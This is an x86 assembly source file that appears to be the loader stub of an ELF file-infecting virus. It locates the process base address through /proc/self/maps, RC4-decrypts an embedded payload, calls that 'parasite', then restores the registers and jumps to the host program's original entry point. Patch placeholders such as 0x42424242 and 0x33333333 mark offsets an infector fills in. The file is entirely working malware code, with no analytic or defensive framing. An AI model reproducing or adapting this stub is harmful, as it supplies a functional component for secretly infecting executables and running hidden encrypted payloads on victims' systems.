BITS 32

global _start

SYS_EXIT	equ 1
SYS_READ	equ 3
SYS_WRITE	equ 4
SYS_OPEN	equ 5
SYS_CLOSE	equ 6
ALLOC_SPACE	equ 16

section .text

_start:
	push eax
	push ebx
	push ecx
	push edx
	push esi

	call get_base_addr
	push eax				; base addr

	; _rc4(void *bytes, uint32_t length, const char *key, uint32_t keysz);
	push 0x55555555			; key size
	mov ebx, eax
	add ebx, 0x44444444		; key ptr
	push ebx
	push 0x19421942			; text size
	mov ebx, eax
	add ebx, 0x22222222		; text addr
	push ebx
	mov ebx, eax
	add ebx, 0x19191919		; rc4 offset
	call ebx
	add esp, 16

	mov ebx, 0x42424242		; parasite offset
	call isso
	cmp eax, 0
	je .call_parasite
	add ebx, [esp]

.call_parasite:
	call ebx

	mov edi, 0x33333333
	call isso
	cmp eax, 0
	je .end_payload
	add edi, [esp]

.end_payload:
	add esp, 4

	pop esi
	pop edx
	pop ecx
	pop ebx
	pop eax

	jmp edi

isso:
	mov eax, 0xAAAAAAAA
	ret

get_base_addr:
	xor eax, eax
	xor ebx, ebx
	xor edx, edx
	xor edi, edi
	xor esi, esi

	jmp .open_file

.setup_read:
	sub esp, ALLOC_SPACE

	;
	; int read(int fd, void *buf, int n)
	;
	mov edx, 1
	mov ebx, eax

.read_char:
	mov eax, SYS_READ
	lea ecx, [esp]
	int 0x80

	cmp BYTE [esp], '-'
	je .done

	inc esi				; addrlen
	mov al, BYTE [esp]
	cmp al, '9'
	jle .found_digit

.found_apha:
	sub al, 0x57
	jmp .compute_addr

.found_digit:
	sub al, '0'

.compute_addr:
	shl edi, 4
	or edi, eax

.prepare_repeat:
	add esp, 1
	jmp .read_char

.done:
	sub esp, esi
	add esp, ALLOC_SPACE

	;
	; close(fd)
	;
	pop ebx
	mov eax, SYS_CLOSE
	int 0x80

	mov eax, edi
	ret

.open_error:
	mov ebx, 1
	mov eax, SYS_EXIT
	int 0x80

.open_file:

	;
	; int open(const char *pathname, int flags)
	;
	mov eax, SYS_OPEN
	xor ecx, ecx
	call $ + 5
	pop ebx
	add ebx, 14
	int 0x80

	cmp eax, 0
	jl .open_error

	push eax	; save fd
	jmp .setup_read

filepath: db "/proc/self/maps",0
